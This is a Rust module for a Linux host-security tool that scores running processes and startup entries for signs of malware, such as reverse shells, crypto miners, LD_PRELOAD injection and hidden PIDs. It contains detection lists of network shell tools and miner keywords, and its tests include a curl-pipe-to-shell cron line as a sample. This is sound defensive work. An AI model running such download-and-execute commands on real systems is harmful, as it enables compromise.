//! Suspicious-process heuristics. Nothing here proves malware: each check is a *signal*
//! (a deleted executable, a binary running from /tmp, a shell wired to a socket...) and
//! the signals are added up so the most unusual processes rise to the top.

use std::collections::{HashMap, HashSet};
use std::fmt::Write as _;
use std::os::unix::fs::MetadataExt;
use std::path::Path;

use crate::pkg::Pm;
use crate::util::run;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Level {
    High,
    Medium,
    Low,
}

#[derive(Clone, Debug)]
pub struct Suspect {
    pub pid: Option<u32>,
    pub name: String,
    pub exe: String,
    pub user: String,
    pub cmdline: String,
    pub score: u32,
    pub reasons: Vec<String>,
    /// Numeric owner (`u32::MAX` when unknown). Compare with the viewer's uid to know whether
    /// stopping it needs administrator rights.
    pub uid: u32,
}

impl Suspect {
    pub fn level(&self) -> Level {
        match self.score {
            60.. => Level::High,
            30..=59 => Level::Medium,
            _ => Level::Low,
        }
    }
}

/// Everything the checks look at for one process.
#[derive(Clone, Debug, Default)]
pub struct ProcInfo {
    pub pid: u32,
    pub uid: u32,
    pub name: String,
    pub exe: Option<String>,
    pub cmdline: String,
    /// stdin/stdout is a network socket.
    pub stdio_socket: bool,
    /// Absolute-path `LD_PRELOAD` entries.
    pub preload: Vec<String>,
    pub cpu_pct: f32,
    /// `Some(false)` = no installed package owns the binary.
    pub owned: Option<bool>,
    pub remote_ports: Vec<u16>,
    /// Name of the parent process (an `ssh` parent makes `nc`/`socat` a `ProxyCommand`, not a shell).
    pub parent_comm: String,
    /// The executable runs from a real `AppImage` FUSE mount under /tmp/.mount_*.
    pub appimage_mounted: bool,
}

const SYSTEM_PREFIXES: &[&str] = &[
    "/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/", "/opt/", "/snap/", "/app/", "/nix/",
];
const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "fish", "ksh", "nc", "ncat", "netcat", "socat", "perl", "python",
    "ruby", "php",
];
/// Programs that merely *mention* a miner name on their command line.
const VIEWERS: &[&str] = &[
    "grep", "egrep", "fgrep", "rg", "ag", "vim", "nvim", "vi", "nano", "less", "more", "cat",
    "head", "tail", "pgrep", "pkill", "man", "sed", "awk", "code", "git",
];
const MINERS: &[&str] = &[
    "xmrig",
    "minerd",
    "cpuminer",
    "ethminer",
    "nbminer",
    "t-rex",
    "lolminer",
    "stratum+tcp",
    "stratum+ssl",
    "--donate-level",
    "cryptonight",
];
const MINING_PORTS: &[u16] = &[3333, 4444, 5555, 7777, 14433, 14444, 45560, 45700];
/// Names that attackers like to imitate.
const IMITATED: &[&str] = &[
    "systemd",
    "sshd",
    "cron",
    "crond",
    "dbus-daemon",
    "kworker",
    "kthreadd",
    "init",
    "rsyslogd",
    "NetworkManager",
    "udevd",
    "agetty",
];
/// Hidden folders in your home that legitimately hold programs.
const KNOWN_HIDDEN: &[&str] = &[
    ".local",
    ".cargo",
    ".rustup",
    ".nvm",
    ".pyenv",
    ".sdkman",
    ".var",
    ".mozilla",
    ".steam",
    ".config",
    ".cache",
    ".npm",
    ".gradle",
    ".m2",
    ".vscode",
    ".vscode-server",
    ".conda",
    ".pixi",
    ".bun",
    ".deno",
];

fn in_system_dir(p: &str) -> bool {
    SYSTEM_PREFIXES.iter().any(|s| p.starts_with(s))
}

/// Turn one process's facts into a score and the reasons behind it.
pub fn assess(p: &ProcInfo, home: &str) -> (u32, Vec<String>) {
    let mut hits: Vec<(u32, String)> = Vec::new();
    macro_rules! add {
        ($pts:expr, $text:expr) => {
            hits.push(($pts, $text))
        };
    }
    macro_rules! score {
        () => {
            hits.iter().map(|h| h.0).sum::<u32>()
        };
    }
    let exe = p.exe.clone().unwrap_or_default();
    let (path, deleted) = match exe.strip_suffix(" (deleted)") {
        Some(x) => (x.to_string(), true),
        None => (exe.clone(), false),
    };
    let appimage = p.appimage_mounted;
    let lower_cmd = format!("{} {}", p.name, p.cmdline).to_lowercase();

    if path.starts_with("/memfd:") {
        // runc re-executes itself from a memfd on every container start; that is normal.
        if !(path.contains("runc")
            || p.name.contains("runc")
            || p.name == "crun"
            || p.name.contains("conmon"))
        {
            add!(
                50,
                "Runs from memory only (memfd), with no file on disk".into()
            );
        }
    } else if deleted {
        if in_system_dir(&path) {
            add!(10, "Its program file was replaced or removed while running (usually an update: restart it)".into());
        } else {
            add!(
                45,
                format!("Its program file {path} was deleted while it kept running")
            );
        }
    }
    if !appimage
        && ["/tmp/", "/var/tmp/", "/dev/shm/"]
            .iter()
            .any(|d| path.starts_with(d))
    {
        add!(40, format!("Runs from a temporary folder ({path})"));
    }
    if let Ok(rest) = Path::new(&path).strip_prefix(home) {
        let rest = rest.to_string_lossy();
        let first_hidden = rest.split('/').find(|c| c.starts_with('.') && c.len() > 1);
        if let Some(h) = first_hidden
            && !KNOWN_HIDDEN.contains(&h)
        {
            add!(25, format!("Runs from a hidden folder in your home ({h})"));
        }
    }
    let basename = path.rsplit('/').next().unwrap_or("");
    if (p.name.starts_with('[') || IMITATED.contains(&p.name.as_str()))
        && !path.is_empty()
        && !in_system_dir(&path)
    {
        add!(
            45,
            format!(
                "Named \"{}\" like a system process, but runs {path}",
                p.name
            )
        );
    } else if !basename.is_empty()
        && p.name.len() > 3
        && !basename.starts_with(&p.name[..p.name.len().min(15)])
        && IMITATED.contains(&p.name.as_str())
    {
        add!(
            30,
            format!(
                "Process name \"{}\" doesn't match its program {basename}",
                p.name
            )
        );
    }
    if p.owned == Some(false) && !deleted && !path.is_empty() && !appimage {
        let in_home = Path::new(&path).starts_with(home);
        // Compiled projects and downloaded tools in your home never have a package.
        add!(
            if in_home {
                5
            } else if p.uid == 0 {
                35
            } else {
                20
            },
            "Its program isn't part of any installed package".into()
        );
    }
    // A local socketpair (IDE terminals, tool harnesses) isn't a reverse shell: it must be a TCP connection.
    let shell_name = p
        .name
        .trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if p.stdio_socket
        && !p.remote_ports.is_empty()
        && SHELLS.contains(&shell_name)
        && p.parent_comm != "ssh"
    {
        add!(
            60,
            format!(
                "{} has its input/output connected to a network socket (reverse-shell pattern)",
                p.name
            )
        );
    }
    for l in &p.preload {
        add!(35, format!("Injects a library with LD_PRELOAD: {l}"));
    }
    let argv0 = p
        .cmdline
        .split_whitespace()
        .next()
        .unwrap_or("")
        .rsplit('/')
        .next()
        .unwrap_or("");
    if !VIEWERS.contains(&argv0) && MINERS.iter().any(|m| lower_cmd.contains(m)) {
        add!(60, "Name or arguments match a crypto miner".into());
    }
    if p.remote_ports.iter().any(|r| MINING_PORTS.contains(r)) {
        add!(
            30,
            "Connected to a port commonly used by mining pools".into()
        );
    }
    if p.cpu_pct > 85.0 && score!() >= 20 {
        add!(
            20,
            format!(
                "Using {:.0}% of a CPU core while also looking unusual",
                p.cpu_pct
            )
        );
    }
    if !p.remote_ports.is_empty() && score!() >= 20 {
        add!(10, "Has outbound network connections".into());
    }
    (score!(), hits.into_iter().map(|h| h.1).collect())
}

// ---------------------------------------------------------------------------------------------
// Gathering
// ---------------------------------------------------------------------------------------------

fn numeric_pids() -> Vec<u32> {
    std::fs::read_dir("/proc")
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| e.file_name().to_string_lossy().parse().ok())
        .collect()
}

fn read(path: String) -> String {
    std::fs::read_to_string(path).unwrap_or_default()
}

fn status_uid(status: &str) -> u32 {
    status
        .lines()
        .find_map(|l| l.strip_prefix("Uid:"))
        .and_then(|v| v.split_whitespace().next())
        .and_then(|v| v.parse().ok())
        .unwrap_or(u32::MAX)
}

fn cpu_ticks(pid: u32) -> Option<u64> {
    let stat = std::fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    // Fields after the ")" that ends the command name; utime and stime are the 12th and 13th.
    let after = stat.rsplit_once(')')?.1;
    let f: Vec<&str> = after.split_whitespace().collect();
    Some(f.get(11)?.parse::<u64>().ok()? + f.get(12)?.parse::<u64>().ok()?)
}

fn user_name(uid: u32) -> String {
    std::fs::read_to_string("/etc/passwd")
        .unwrap_or_default()
        .lines()
        .find_map(|l| {
            let f: Vec<&str> = l.split(':').collect();
            (f.get(2)?.parse::<u32>().ok()? == uid).then(|| f[0].to_string())
        })
        .unwrap_or_else(|| uid.to_string())
}

/// Executables that no installed package owns.
fn unowned(paths: &[String], pm: Option<Pm>) -> HashSet<String> {
    let mut missing = HashSet::new();
    let Some(pm) = pm else { return missing };
    for chunk in paths.chunks(150) {
        match pm {
            Pm::Dnf | Pm::Zypper => {
                let mut args = vec!["-qf", "--qf", "%{NAME}\\n"];
                args.extend(chunk.iter().map(String::as_str));
                let out = run("rpm", &args);
                for l in out.stdout.lines().chain(out.stderr.lines()) {
                    if let Some(rest) = l.strip_prefix("file ")
                        && let Some(p) = rest.strip_suffix(" is not owned by any package")
                    {
                        missing.insert(p.to_string());
                    }
                }
            }
            Pm::Apt => {
                let mut args = vec!["-S", "--"];
                args.extend(chunk.iter().map(String::as_str));
                let out = run("dpkg", &args);
                let owned: HashSet<&str> = out
                    .stdout
                    .lines()
                    .filter_map(|l| l.split_once(": ").map(|x| x.1))
                    .collect();
                for p in chunk {
                    // dpkg's database may list /bin/x where the process resolves to /usr/bin/x.
                    let alt = p.strip_prefix("/usr").unwrap_or(p);
                    if !owned.contains(p.as_str()) && !owned.contains(alt) {
                        missing.insert(p.clone());
                    }
                }
            }
            Pm::Pacman => {
                let mut args = vec!["-Qo", "-q"];
                args.extend(chunk.iter().map(String::as_str));
                let out = run("pacman", &args);
                for l in out.stderr.lines() {
                    if let Some(p) = l.strip_prefix("error: No package owns ") {
                        missing.insert(p.trim().to_string());
                    }
                }
            }
        }
    }
    missing
}

/// pid → remote ports of its established TCP connections.
fn connections() -> HashMap<u32, Vec<u16>> {
    let mut map: HashMap<u32, Vec<u16>> = HashMap::new();
    for l in run("ss", &["-H", "-tnp", "state", "established"])
        .stdout
        .lines()
    {
        // Everything from "users:" on may contain spaces (process names like "Web Content").
        let (head, users) = l.split_once("users:").unwrap_or((l, ""));
        let f: Vec<&str> = head.split_whitespace().collect();
        let Some(peer) = f.get(3) else {
            continue;
        };
        let Some(port) = peer
            .rsplit_once(':')
            .and_then(|(_, p)| p.parse::<u16>().ok())
        else {
            continue;
        };
        for part in users.split("pid=").skip(1) {
            if let Some(pid) = part
                .split(|c: char| !c.is_ascii_digit())
                .next()
                .and_then(|n| n.parse().ok())
            {
                map.entry(pid).or_default().push(port);
            }
        }
    }
    map
}

/// Mount points of FUSE filesystems (`AppImages` mount themselves at /tmp/.mount_*).
fn fuse_mounts() -> Vec<String> {
    std::fs::read_to_string("/proc/self/mountinfo")
        .unwrap_or_default()
        .lines()
        .filter_map(|l| {
            let (before, after) = l.split_once(" - ")?;
            let mount_point = before.split_whitespace().nth(4)?;
            after
                .split_whitespace()
                .next()?
                .starts_with("fuse")
                .then(|| mount_point.to_string())
        })
        .collect()
}

/// `LD_PRELOAD` libraries that ordinary software sets: system library folders and Steam's overlay.
fn benign_preload(lib: &str) -> bool {
    ["/usr/lib/", "/usr/lib64/", "/lib/", "/lib64/"]
        .iter()
        .any(|d| lib.starts_with(d))
        || lib.rsplit('/').next() == Some("gameoverlayrenderer.so")
}

fn gather(pid: u32, my_uid: u32, fuse: &[String]) -> Option<ProcInfo> {
    let status = std::fs::read_to_string(format!("/proc/{pid}/status")).ok()?;
    let uid = status_uid(&status);
    let cmd_raw = std::fs::read(format!("/proc/{pid}/cmdline")).unwrap_or_default();
    let cmdline: String = String::from_utf8_lossy(&cmd_raw)
        .replace('\0', " ")
        .trim()
        .to_string();
    let exe = std::fs::read_link(format!("/proc/{pid}/exe"))
        .ok()
        .map(|p| p.to_string_lossy().to_string());
    // Kernel threads have neither a command line nor an executable.
    if exe.is_none() && cmdline.is_empty() {
        return None;
    }
    let name = read(format!("/proc/{pid}/comm")).trim().to_string();
    let mine = uid == my_uid || my_uid == 0;
    let (mut stdio_socket, mut preload) = (false, Vec::new());
    if mine {
        stdio_socket = [0, 1].iter().any(|fd| {
            std::fs::read_link(format!("/proc/{pid}/fd/{fd}"))
                .is_ok_and(|t| t.to_string_lossy().starts_with("socket:"))
        });
        let env = std::fs::read(format!("/proc/{pid}/environ")).unwrap_or_default();
        for kv in env.split(|b| *b == 0) {
            if let Some(v) = kv.strip_prefix(b"LD_PRELOAD=") {
                for lib in String::from_utf8_lossy(v)
                    .split([' ', ':'])
                    .filter(|l| l.starts_with('/'))
                {
                    if !benign_preload(lib) {
                        preload.push(lib.to_string());
                    }
                }
            }
        }
    }
    let ppid: u32 = status
        .lines()
        .find_map(|l| l.strip_prefix("PPid:"))
        .and_then(|v| v.trim().parse().ok())
        .unwrap_or(0);
    let parent_comm = read(format!("/proc/{ppid}/comm")).trim().to_string();
    let appimage_mounted = exe.as_deref().is_some_and(|e| {
        e.starts_with("/tmp/.mount_")
            && fuse
                .iter()
                .any(|m| m.starts_with("/tmp/.mount_") && Path::new(e).starts_with(m))
    });
    Some(ProcInfo {
        pid,
        uid,
        name,
        exe,
        cmdline,
        stdio_socket,
        preload,
        parent_comm,
        appimage_mounted,
        ..Default::default()
    })
}

/// Every distinct program file that a running process was started from.
pub fn running_executables() -> Vec<String> {
    let mut v: Vec<String> = numeric_pids()
        .into_iter()
        .filter_map(|p| std::fs::read_link(format!("/proc/{p}/exe")).ok())
        .map(|p| p.to_string_lossy().to_string())
        .filter(|p| p.starts_with('/') && !p.ends_with(" (deleted)") && Path::new(p).is_file())
        .collect();
    v.sort();
    v.dedup();
    v
}

#[derive(Clone, Debug, Default)]
pub struct ScanResult {
    pub suspects: Vec<Suspect>,
    pub inspected: usize,
    /// Processes owned by other users whose details this account can't read.
    pub opaque: usize,
    /// Program files of the processes that could be inspected (all of them when run as root).
    pub exes: Vec<String>,
}

pub fn scan() -> ScanResult {
    // SAFETY: geteuid has no preconditions.
    let my_uid = unsafe { libc::geteuid() };
    let home = crate::util::home().display().to_string();
    let me = std::process::id();
    let fuse = fuse_mounts();
    let mut procs: Vec<ProcInfo> = numeric_pids()
        .into_iter()
        .filter(|&p| p != me)
        .filter_map(|p| gather(p, my_uid, &fuse))
        .collect();

    // CPU over one second.
    let before: HashMap<u32, u64> = procs
        .iter()
        .filter_map(|p| cpu_ticks(p.pid).map(|t| (p.pid, t)))
        .collect();
    std::thread::sleep(std::time::Duration::from_secs(1));
    // SAFETY: sysconf has no preconditions.
    let hz = unsafe { libc::sysconf(libc::_SC_CLK_TCK) }.max(1) as f32;
    for p in &mut procs {
        if let (Some(a), Some(b)) = (before.get(&p.pid), cpu_ticks(p.pid)) {
            p.cpu_pct = b.saturating_sub(*a) as f32 / hz * 100.0;
        }
    }

    let conns = connections();
    // Binaries outside the home folder are checked against the package database.
    let mut exes: Vec<String> = procs
        .iter()
        .filter_map(|p| p.exe.clone())
        .filter(|e| {
            !e.ends_with(" (deleted)")
                && e.starts_with('/')
                && !Path::new(e).starts_with(&home)
                && !e.starts_with("/memfd:")
                && !e.starts_with("/tmp/")
                && !e.starts_with("/proc/")
                // Self-contained app trees, other users' homes and container-internal paths are never
                // owned by a host package.
                && !["/snap/", "/nix/", "/app/", "/var/lib/snapd/", "/var/lib/flatpak/", "/home/", "/root/"]
                    .iter()
                    .any(|d| e.starts_with(d))
                && Path::new(e).exists()
        })
        .collect();
    exes.sort();
    exes.dedup();
    let missing = unowned(&exes, Pm::detect());
    for p in &mut procs {
        p.remote_ports = conns.get(&p.pid).cloned().unwrap_or_default();
        if let Some(e) = &p.exe {
            if missing.contains(e) {
                p.owned = Some(false);
            } else if Path::new(e).starts_with(&home) || e.starts_with("/tmp/") {
                p.owned = Some(false); // never packaged
            }
        }
    }

    let opaque = procs
        .iter()
        .filter(|p| p.exe.is_none() && p.uid != my_uid && my_uid != 0)
        .count();
    let mut suspects: Vec<Suspect> = procs
        .iter()
        .filter_map(|p| {
            let (score, reasons) = assess(p, &home);
            (score >= 15).then(|| Suspect {
                pid: Some(p.pid),
                name: p.name.clone(),
                exe: p.exe.clone().unwrap_or_default(),
                user: user_name(p.uid),
                cmdline: p.cmdline.chars().take(300).collect(),
                score,
                reasons,
                uid: p.uid,
            })
        })
        .collect();
    suspects.extend(hidden_pids());
    suspects.extend(startup_entries(&home));
    suspects.sort_by_key(|s| std::cmp::Reverse(s.score));
    ScanResult {
        suspects,
        inspected: procs.len(),
        opaque,
        exes: running_executables(),
    }
}

/// A process that answers to its `/proc/<pid>` folder but is missing from the /proc listing is
/// being hidden from tools like `ps`: a classic rootkit trick.
fn hidden_pids() -> Vec<Suspect> {
    let max: u32 = std::fs::read_to_string("/proc/sys/kernel/pid_max")
        .ok()
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(32768)
        .min(400_000);
    let listed: HashSet<u32> = numeric_pids().into_iter().collect();
    let candidates: Vec<u32> = (2..=max)
        .filter(|p| !listed.contains(p) && Path::new(&format!("/proc/{p}/stat")).exists())
        .collect();
    // Anything that has only just started or exited will now appear in (or vanish from) a fresh listing.
    let relisted: HashSet<u32> = numeric_pids().into_iter().collect();
    // Threads answer at /proc/<tid> without being listed; only a thread-group leader counts as a process.
    let is_process = |pid: &u32| {
        read(format!("/proc/{pid}/status"))
            .lines()
            .find_map(|l| l.strip_prefix("Tgid:"))
            .is_some_and(|t| t.trim() == pid.to_string())
    };
    candidates
        .into_iter()
        .filter(|p| {
            !relisted.contains(p) && Path::new(&format!("/proc/{p}/stat")).exists() && is_process(p)
        })
        .map(|pid| Suspect {
            pid: Some(pid),
            name: read(format!("/proc/{pid}/comm")).trim().to_string(),
            exe: String::new(),
            user: String::new(),
            cmdline: String::new(),
            score: 80,
            reasons: vec![
                "Responds at /proc/<pid> but is missing from the process list (hidden from ps/top)"
                    .into(),
            ],
            uid: u32::MAX,
        })
        .collect()
}

// ---------------------------------------------------------------------------------------------
// Startup entries (persistence)
// ---------------------------------------------------------------------------------------------

/// What makes a startup command worth a look.
pub fn suspicious_command(line: &str, home: &str) -> Option<String> {
    let l = line.trim();
    if l.is_empty() || l.starts_with('#') {
        return None;
    }
    if (l.contains("curl ") || l.contains("wget "))
        && (l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash"))
    {
        return Some("downloads and runs a script from the internet".into());
    }
    if l.contains("base64 -d") || l.contains("base64 --decode") {
        return Some("decodes hidden data before running it".into());
    }
    for d in ["/tmp/", "/var/tmp/", "/dev/shm/"] {
        if l.contains(d) && !l.contains("/tmp/.mount_") {
            return Some(format!("runs something from {d}"));
        }
    }
    let hidden = format!("{home}/.");
    if let Some(i) = l.find(&hidden) {
        let seg = l[i + hidden.len()..].split('/').next().unwrap_or("");
        if !KNOWN_HIDDEN.contains(&format!(".{seg}").as_str()) && !seg.is_empty() {
            return Some(format!("runs something from a hidden folder (~/.{seg})"));
        }
    }
    None
}

fn startup_entries(home: &str) -> Vec<Suspect> {
    let mut files: Vec<std::path::PathBuf> = Vec::new();
    let mut add_dir = |dir: &str, ext: Option<&str>| {
        // A symlinked folder or file could point anywhere (this runs as root in the administrator
        // scan, with a home path it was given), so only real folders and regular files are read.
        if std::fs::symlink_metadata(dir).is_ok_and(|m| m.file_type().is_symlink()) {
            return;
        }
        for e in std::fs::read_dir(dir).into_iter().flatten().flatten() {
            let p = e.path();
            let regular = e.file_type().is_ok_and(|t| t.is_file());
            if regular && ext.is_none_or(|x| p.extension().is_some_and(|e| e == x)) {
                files.push(p);
            }
        }
    };
    add_dir("/etc/cron.d", None);
    add_dir(&format!("{home}/.config/autostart"), Some("desktop"));
    add_dir(&format!("{home}/.config/systemd/user"), Some("service"));
    add_dir("/etc/systemd/system", Some("service"));
    add_dir("/etc/xdg/autostart", Some("desktop"));
    let mut out = Vec::new();
    for f in files {
        // Only files modified in the last 90 days are interesting: old ones are settled.
        let recent = std::fs::metadata(&f).ok().is_some_and(|m| {
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map_or(0, |d| d.as_secs() as i64);
            now - m.mtime() < 90 * 86_400
        });
        let text = std::fs::read_to_string(&f).unwrap_or_default();
        let reasons: Vec<String> = text
            .lines()
            .filter(|l| {
                l.starts_with("Exec")
                    || !l.contains('=')
                    || l.starts_with('*')
                    || l.chars().next().is_some_and(|c| c.is_ascii_digit())
            })
            .filter_map(|l| suspicious_command(l, home))
            .collect();
        if let Some(r) = reasons.first() {
            out.push(Suspect {
                pid: None,
                name: f
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default(),
                exe: f.display().to_string(),
                user: String::new(),
                cmdline: String::new(),
                score: if recent { 50 } else { 35 },
                reasons: vec![format!(
                    "Startup entry that {r}{}",
                    if recent {
                        " (changed in the last 90 days)"
                    } else {
                        ""
                    }
                )],
                uid: u32::MAX,
            });
        }
    }
    out
}

// ---------------------------------------------------------------------------------------------
// Passing results from an administrator-run scan back to the window
// ---------------------------------------------------------------------------------------------

fn clean(s: &str) -> String {
    s.replace(['\t', '\n', '\r', '\u{1f}'], " ")
}

/// One line per suspect, tab-separated, so no serialisation library is needed.
pub fn encode(r: &ScanResult) -> String {
    let mut out = format!("H\t{}\t{}\n", r.inspected, r.opaque);
    for e in &r.exes {
        let _ = writeln!(out, "E\t{}", clean(e));
    }
    for s in &r.suspects {
        let _ = writeln!(
            out,
            "S\t{}\t{}\t{}\t{}\t{}\t{}\t{}\t{}",
            s.pid.map_or("-".to_string(), |p| p.to_string()),
            s.score,
            s.uid,
            clean(&s.name),
            clean(&s.exe),
            clean(&s.user),
            clean(&s.cmdline),
            s.reasons
                .iter()
                .map(|r| clean(r))
                .collect::<Vec<_>>()
                .join("\u{1f}"),
        );
    }
    out
}

/// Reads `encode` output; unrelated lines (pkexec chatter, the command echo) are ignored.
pub fn decode(text: &str) -> Option<ScanResult> {
    let mut r = ScanResult::default();
    let mut got_header = false;
    for line in text.lines() {
        let f: Vec<&str> = line.split('\t').collect();
        match f.first().copied() {
            Some("H") if f.len() == 3 => {
                r.inspected = f[1].parse().ok()?;
                r.opaque = f[2].parse().ok()?;
                got_header = true;
            }
            Some("E") if f.len() == 2 => r.exes.push(f[1].to_string()),
            Some("S") if f.len() == 9 => r.suspects.push(Suspect {
                pid: f[1].parse().ok(),
                score: f[2].parse().ok()?,
                uid: f[3].parse().ok()?,
                name: f[4].into(),
                exe: f[5].into(),
                user: f[6].into(),
                cmdline: f[7].into(),
                reasons: f[8]
                    .split('\u{1f}')
                    .filter(|x| !x.is_empty())
                    .map(str::to_string)
                    .collect(),
            }),
            _ => {}
        }
    }
    got_header.then_some(r)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn results_survive_the_trip_through_text() {
        let r = ScanResult {
            inspected: 12,
            opaque: 3,
            exes: vec!["/usr/bin/a".into()],
            suspects: vec![Suspect {
                pid: Some(42),
                name: "we\tird".into(),
                exe: "/tmp/x (deleted)".into(),
                user: "root".into(),
                cmdline: "a\nb c".into(),
                score: 85,
                reasons: vec!["one".into(), "two; three".into()],
                uid: 0,
            }],
        };
        let text = format!("# pkexec noise\n{}garbage\n", encode(&r));
        let back = decode(&text).unwrap();
        assert_eq!((back.inspected, back.opaque), (12, 3));
        let s = &back.suspects[0];
        assert_eq!((s.pid, s.score, s.uid), (Some(42), 85, 0));
        assert_eq!(s.reasons, vec!["one", "two; three"]);
        assert_eq!(s.name, "we ird");
        assert_eq!(back.exes, vec!["/usr/bin/a"]);
        assert!(decode("no header here").is_none());
    }

    fn p(name: &str, exe: &str) -> ProcInfo {
        ProcInfo {
            pid: 100,
            uid: 1000,
            name: name.into(),
            exe: Some(exe.into()),
            ..Default::default()
        }
    }

    #[test]
    fn ordinary_processes_score_zero() {
        assert_eq!(assess(&p("bash", "/usr/bin/bash"), "/home/u").0, 0);
        let mut ide = p(
            "idea",
            "/home/u/.local/share/JetBrains/Toolbox/apps/idea/bin/idea",
        );
        ide.owned = Some(false);
        assert!(
            assess(&ide, "/home/u").0 < 15,
            "a packaged-less IDE in a known hidden dir is fine"
        );
        let mut appimage = p("app", "/tmp/.mount_AppAbc/app");
        appimage.appimage_mounted = true;
        assert_eq!(
            assess(&appimage, "/home/u").0,
            0,
            "real AppImages run from a FUSE mount"
        );
        assert!(
            assess(&p("app", "/tmp/.mount_x/payload"), "/home/u").0 >= 40,
            "a lookalike path that isn't a mount is still a temp-folder program"
        );
    }

    #[test]
    fn flags_the_classic_signs() {
        let h = "/home/u";
        assert!(assess(&p("x", "/tmp/x"), h).0 >= 40);
        assert!(assess(&p("x", "/dev/shm/.x (deleted)"), h).0 >= 80);
        assert!(assess(&p("x", "/memfd:payload (deleted)"), h).0 >= 50);
        assert!(
            assess(&p("sshd", "/home/u/.hidden/sshd"), h).0 >= 60,
            "imitating sshd from home"
        );
        let mut shell = p("bash", "/usr/bin/bash");
        shell.stdio_socket = true;
        shell.remote_ports = vec![4444];
        let mut local_pair = shell.clone();
        local_pair.remote_ports.clear();
        assert_eq!(
            assess(&local_pair, h).0,
            0,
            "a unix socketpair is not a reverse shell"
        );
        assert!(assess(&shell, h).0 >= 60);
        let mut m = p("kworker", "/usr/bin/x");
        m.cmdline = "xmrig --donate-level 1".into();
        assert!(assess(&m, h).0 >= 60);
        let mut pre = p("ls", "/usr/bin/ls");
        pre.preload = vec!["/tmp/evil.so".into()];
        assert!(assess(&pre, h).0 >= 35);
    }

    #[test]
    fn known_benign_cases_stay_quiet() {
        let h = "/home/u";
        // Steam preloads its overlay into every game.
        assert!(benign_preload(
            "/home/u/.local/share/Steam/ubuntu12_64/gameoverlayrenderer.so"
        ));
        assert!(
            benign_preload("/usr/lib64/libfoo.so") && !benign_preload("/usr/library-evil/x.so")
        );
        // runc starts containers from a memfd copy of itself.
        assert_eq!(
            assess(&p("runc", "/memfd:runc_cloned:/proc/self/exe (deleted)"), h).0,
            0
        );
        // nc as an ssh ProxyCommand has a socketpair on stdio and a TCP connection.
        let mut proxy = p("nc", "/usr/bin/nc");
        proxy.stdio_socket = true;
        proxy.remote_ports = vec![22];
        proxy.parent_comm = "ssh".into();
        assert_eq!(assess(&proxy, h).0, 0);
        proxy.parent_comm = "bash".into();
        assert!(assess(&proxy, h).0 >= 60);
        // python3.12 is a shell-capable interpreter too.
        let mut py = p("python3.12", "/usr/bin/python3.12");
        py.stdio_socket = true;
        py.remote_ports = vec![4444];
        assert!(assess(&py, h).0 >= 60);
        // A viewer that mentions a miner is not a miner.
        let mut grep = p("grep", "/usr/bin/grep");
        grep.cmdline = "grep xmrig notes.txt".into();
        assert_eq!(assess(&grep, h).0, 0);
        // /home/ab is not inside /home/a.
        assert_eq!(assess(&p("x", "/home/ab/.x/bin/x"), "/home/a").0, 0);
    }

    #[test]
    fn an_update_leaves_a_deleted_system_binary_only_mildly_suspicious() {
        let (score, _) = assess(
            &p("firefox", "/usr/lib64/firefox/firefox (deleted)"),
            "/home/u",
        );
        assert!(score < 15);
    }

    #[test]
    fn startup_commands() {
        let h = "/home/u";
        assert!(suspicious_command("* * * * * curl http://x/a.sh | sh", h).is_some());
        assert!(suspicious_command("ExecStart=/tmp/run.sh", h).is_some());
        assert!(suspicious_command("Exec=/home/u/.sneaky/bin/x", h).is_some());
        assert!(suspicious_command("Exec=/home/u/.local/bin/tool", h).is_none());
        assert!(suspicious_command("# curl x | sh", h).is_none());
        assert!(suspicious_command("ExecStart=/usr/bin/foo", h).is_none());
    }

    #[test]
    fn parses_cpu_ticks_with_awkward_names() {
        // Not a real process: just checks the field offsets on a typical stat line.
        let line = "1 (a b) c) S 0 1 1 0 -1 4194560 100 0 0 0 7 3 0 0 20 0 1 0 5 1000 10 18446744073709551615";
        let f: Vec<&str> = line
            .rsplit_once(')')
            .unwrap()
            .1
            .split_whitespace()
            .collect();
        assert_eq!(
            f[11].parse::<u64>().unwrap() + f[12].parse::<u64>().unwrap(),
            10
        );
    }
}
